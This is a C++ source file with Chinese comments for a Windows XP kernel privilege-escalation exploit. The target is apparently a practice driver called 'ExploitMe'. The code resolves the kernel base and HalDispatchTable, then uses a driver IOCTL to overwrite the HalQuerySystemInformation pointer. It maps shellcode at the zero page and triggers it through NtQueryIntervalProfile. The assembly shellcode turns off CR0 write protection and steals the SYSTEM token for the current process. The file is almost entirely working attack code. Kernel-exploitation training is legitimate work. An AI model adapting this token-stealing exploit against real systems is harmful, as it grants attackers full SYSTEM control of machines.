// exploit.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "ntapi.h"
#pragma comment(linker,"/defaultlib:ntdll.lib")

#define PAGE_SIZE 0x1000  
#define OBJ_CASE_INSENSITIVE 0x00000040  
#define FILE_OPEN_IF 0x00000003  
#define KERNEL_NAME_LENGTH 0x0D  
#define BUFFER_LENGTH 0x04  
  
//触发漏洞使用的IoControlCode  
#define IOCTL_METHOD_NEITHER 0x8888A003  
   
int g_uCr0 = 0;  
int g_isRing0ShellcodeCalled = 0;  
  
//Ring0中执行的Shellcode   
NTSTATUS Ring0ShellCode(      
                        ULONG InformationClass,  
                        ULONG BufferSize,  
                        PVOID Buffer,  
                        PULONG ReturnedLength)  
{  
    //打开内核写  
    __asm  
    {  
        cli;  
        mov eax, cr0;  
        mov g_uCr0,eax;   
        and eax,0xFFFEFFFF;   
        mov cr0, eax;   
    }  
    //USEFULL FOR XP SP3  
    __asm  
    {  
        //KPCR   
        //由于Windows需要支持多个CPU, 因此Windows内核中为此定义了一套以处理器控制区(Processor Control Region)  
        //即KPCR为枢纽的数据结构, 使每个CPU都有个KPCR. 其中KPCR这个结构中有一个域KPRCB(Kernel Processor Control Block)结构,   
        //这个结构扩展了KPCR. 这两个结构用来保存与线程切换相关的全局信息.   
        //通常fs段寄存器在内核模式下指向KPCR, 用户模式下指向TEB.  
        //http://blog.csdn.net/hu3167343/article/details/7612595  
        //http://huaidan.org/archives/2081.html  
        mov eax, 0xffdff124  //KPCR这个结构是一个相当稳定的结构,我们甚至可以从内存[0FFDFF124h]获取当前线程的ETHREAD指针。  
        mov eax,[eax] //PETHREAD  
        mov esi,[eax+0x220] //PEPROCESS  
        mov eax, esi  
searchXp:  
        mov eax,[eax+0x88] //NEXT EPROCESS  
        sub eax,0x88  
        mov edx,[eax+0x84] //PID  
        cmp edx,0x4 //SYSTEM PID  
        jne searchXp  
        mov eax, [eax+0xc8] //SYSTEM TOKEN  
        mov [esi+0xc8],eax //CURRENT PROCESS TOKEN  
    }  
    //关闭内核写  
    __asm  
    {  
        sti;  
        mov eax, g_uCr0;  
        mov cr0,eax;  
    }  
  
    g_isRing0ShellcodeCalled = 1;  
    return 0;  
}    
  
//申请内存的函数  
PVOID MyAllocateMemory(IN ULONG Length)  
{  
    NTSTATUS NtStatus;  
    PVOID BaseAddress = NULL;  
    NtStatus = NtAllocateVirtualMemory(  
        NtCurrentProcess(),  
        &BaseAddress,  
        0,  
        &Length,  
        MEM_RESERVE |  
        MEM_COMMIT,  
        PAGE_READWRITE);  
    if(NtStatus == STATUS_SUCCESS)  
    {  
        RtlZeroMemory(BaseAddress, Length);  
        return BaseAddress;  
    }  
    return NULL;  
}  
  
//释放内存的函数  
VOID MyFreeMemory(IN PVOID BaseAddress)  
{  
    NTSTATUS NtStatus;  
    ULONG FreeSize = 0;  
    NtStatus = NtFreeVirtualMemory(  
        NtCurrentProcess(),  
        &BaseAddress,  
        &FreeSize,  
        MEM_RELEASE);  
}  
  
//main函数  
int main(int argc, char* argv[])  
{  
    NTSTATUS NtStatus;  
    HANDLE DeviceHandle=NULL;  
    ULONG ReturnLength = 0;  
    ULONG ImageBase;  
    PVOID MappedBase=NULL;  
    UCHAR ImageName[KERNEL_NAME_LENGTH];  
    ULONG DllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;  
    PVOID HalDispatchTable;  
    PVOID xHalQuerySystemInformation;  
    ULONG ShellCodeSize = PAGE_SIZE;  
    PVOID ShellCodeAddress;  
    PVOID BaseAddress = NULL;  
    UNICODE_STRING DeviceName;  
    UNICODE_STRING DllName;  
    ANSI_STRING ProcedureName;  
    OBJECT_ATTRIBUTES ObjectAttributes;  
    IO_STATUS_BLOCK IoStatusBlock;  
    SYSTEM_MODULE_INFORMATION *ModuleInformation = NULL;  
    LARGE_INTEGER Interval;  
    ULONG InputData=0;  
  
    //清空控制台屏幕  
    system("cls");  
  
    //printf("Please press any key to exploit");  
    //getch();  
    //从line 139-->line 214都是在获取内核函数xHalQuerySystemInformation的内存地址  
    //获取内核模块列表数据长度到ReturnLength  
    NtStatus = NtQuerySystemInformation(  
        SystemModuleInformation,  
        ModuleInformation,  
        ReturnLength,  
        &ReturnLength);  
    if(NtStatus != STATUS_INFO_LENGTH_MISMATCH)  
    {  
        printf("NtQuerySystemInformation get len failed! NtStatus=%.8X\n", NtStatus);   
        goto ret;  
    }  
  
    //申请内存  
    ReturnLength = (ReturnLength & 0xFFFFF000) + PAGE_SIZE * sizeof(ULONG);  
    ModuleInformation = (SYSTEM_MODULE_INFORMATION *)MyAllocateMemory(ReturnLength);  
    if(ModuleInformation==NULL)  
    {  
        printf("MyAllocateMemory failed! Length=%.8X\n", ReturnLength);   
        goto ret;  
    }  
  
    //获取内核模块列表数据  
    NtStatus = NtQuerySystemInformation(  
        SystemModuleInformation,  
        ModuleInformation,  
        ReturnLength,  
        NULL);  
    if(NtStatus != STATUS_SUCCESS)  
    {  
        printf("NtQuerySystemInformation get info failed! NtStatus=%.8X\n", NtStatus);   
        goto ret;  
    }  
                  
    //保存内核第一个模块（即nt模块）基址和名称，并打印  
    ImageBase = (ULONG)(ModuleInformation->Module[0].Base);  
    RtlMoveMemory(  
        ImageName,  
        (PVOID)(ModuleInformation->Module[0].ImageName +  
        ModuleInformation->Module[0].PathLength),  
        KERNEL_NAME_LENGTH);  
    printf("ImageBase=0x%.8X ImageName=%s\n",ImageBase, ImageName);  
      
  
    //获取内核模块名称字符串的Unicode字符串  
    RtlCreateUnicodeStringFromAsciiz(&DllName, (PUCHAR)ImageName);  
  
    //加载内核模块到本进程空间  
    NtStatus = LdrLoadDll(  
        NULL,                // DllPath  
        &DllCharacteristics, // DllCharacteristics  
        &DllName,            // DllName  
        &MappedBase);        // DllHandle  
    if(NtStatus)  
    {  
        printf("LdrLoadDll failed! NtStatus=%.8X\n", NtStatus);      
        goto ret;  
    }  
  
    //获取内核模块在本进程空间中导出名称HalDispatchTable的地址  
    RtlInitAnsiString(&ProcedureName, (PUCHAR)"HalDispatchTable");  
    NtStatus = LdrGetProcedureAddress(  
        (PVOID)MappedBase,          // DllHandle  
        &ProcedureName,             // ProcedureName  
        0,                          // ProcedureNumber OPTIONAL  
        (PVOID*)&HalDispatchTable); // ProcedureAddress  
    if(NtStatus)  
    {  
        printf("LdrGetProcedureAddress failed! NtStatus=%.8X\n", NtStatus);      
        goto ret;  
    }  
  
    //计算实际的HalDispatchTable内核地址  
    HalDispatchTable = (PVOID)((ULONG)HalDispatchTable - (ULONG)MappedBase);  
    HalDispatchTable = (PVOID)((ULONG)HalDispatchTable + (ULONG)ImageBase);  
  
    //HalDispatchTable中的第二个ULONG就是HalQuerySystemInformation函数的地址  
    xHalQuerySystemInformation = (PVOID)((ULONG)HalDispatchTable + sizeof(ULONG));  
  
    //打印HalDispatchTable内核地址和xHalQuerySystemInformation值  
    printf("HalDispatchTable=%p xHalQuerySystemInformation=%p\n",  
        HalDispatchTable,  
        xHalQuerySystemInformation);  
  
    //设备名称的Unicode字符串  
    RtlInitUnicodeString(&DeviceName, L"\\Device\\ExploitMe");  
  
    //打开ExploitMe设备  
    ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);  
    ObjectAttributes.RootDirectory = 0;  
    ObjectAttributes.ObjectName = &DeviceName;  
    ObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE;  
    ObjectAttributes.SecurityDescriptor = NULL;  
    ObjectAttributes.SecurityQualityOfService = NULL;  
    NtStatus = NtCreateFile(  
        &DeviceHandle,     // FileHandle  
        FILE_READ_DATA |  
        FILE_WRITE_DATA,   // DesiredAccess  
        &ObjectAttributes, // ObjectAttributes  
        &IoStatusBlock,    // IoStatusBlock  
        NULL,              // AllocationSize OPTIONAL  
        0,                 // FileAttributes  
        FILE_SHARE_READ |  
        FILE_SHARE_WRITE, // ShareAccess  
        FILE_OPEN_IF,     // CreateDisposition  
        0,                // CreateOptions  
        NULL,             // EaBuffer OPTIONAL  
        0);               // EaLength  
    if(NtStatus)  
    {  
        printf("NtCreateFile failed! NtStatus=%.8X\n", NtStatus);      
        goto ret;  
    }  
    //利用漏洞将HalQuerySystemInformation函数地址改为0  
    InputData = 0;  
    NtStatus = NtDeviceIoControlFile(  
        DeviceHandle,         // FileHandle  
        NULL,                 // Event  
        NULL,                 // ApcRoutine  
        NULL,                 // ApcContext  
        &IoStatusBlock,       // IoStatusBlock  
        IOCTL_METHOD_NEITHER, // IoControlCode  
        &InputData,           // InputBuffer--->任意数据（0）  
        BUFFER_LENGTH,        // InputBufferLength  
        xHalQuerySystemInformation, // OutputBuffer-->任意地址  
        BUFFER_LENGTH);       // OutBufferLength  
    if(NtStatus)  
    {  
        printf("NtDeviceIoControlFile failed! NtStatus=%.8X\n", NtStatus);  
        goto ret;  
    }   
  
    //在本进程空间申请0地址内存  
    ShellCodeAddress = (PVOID)sizeof(ULONG);//4  
    NtStatus = NtAllocateVirtualMemory(  
        NtCurrentProcess(),      // ProcessHandle  
        &ShellCodeAddress,       // BaseAddress 4  
        0,                       // ZeroBits  
        &ShellCodeSize,          // AllocationSize  
        MEM_RESERVE |   
        MEM_COMMIT |  
        MEM_TOP_DOWN,            // AllocationType  
        PAGE_EXECUTE_READWRITE); // Protect可执行，可读可写  
    if(NtStatus)  
    {  
        printf("NtAllocateVirtualMemory failed! NtStatus=%.8X\n", NtStatus);      
        goto ret;  
    }  
    printf("NtAllocateVirtualMemory succeed! ShellCodeAddress=%p\n", ShellCodeAddress);   
  
    //复制Ring0ShellCode到0地址内存中  
    RtlMoveMemory(  
        ShellCodeAddress,  
        (PVOID)Ring0ShellCode,  
        ShellCodeSize);  
  
    //触发漏洞  
    NtStatus = NtQueryIntervalProfile(  
        ProfileTotalIssues, // Source  
        NULL);              // Interval  
    if(NtStatus)  
    {  
        printf("NtQueryIntervalProfile failed! NtStatus=%.8X\n", NtStatus);  
        goto ret;  
    }  
    printf("NtQueryIntervalProfile succeed!\n");  
  
  
  
ret:  
    if(g_isRing0ShellcodeCalled)  
    {  
        printf("exploit done success!\n");  
    }  
    else  
    {  
        printf("exploit failed\n");  
    }  
  
    system("pause");  
    //释放申请的内存  
    if (ModuleInformation)  
    {  
        MyFreeMemory(ModuleInformation);  
    }  
    //卸载本进程中的内核模块  
    if (MappedBase)  
    {  
        LdrUnloadDll((PVOID)MappedBase);  
    }  
    //关闭句柄  
    if(DeviceHandle)  
    {  
        NtStatus = NtClose(DeviceHandle);  
        if(NtStatus)  
        {  
            printf("NtClose failed! NtStatus=%.8X\n", NtStatus);      
        }  
    }  
    return 0;  
}  
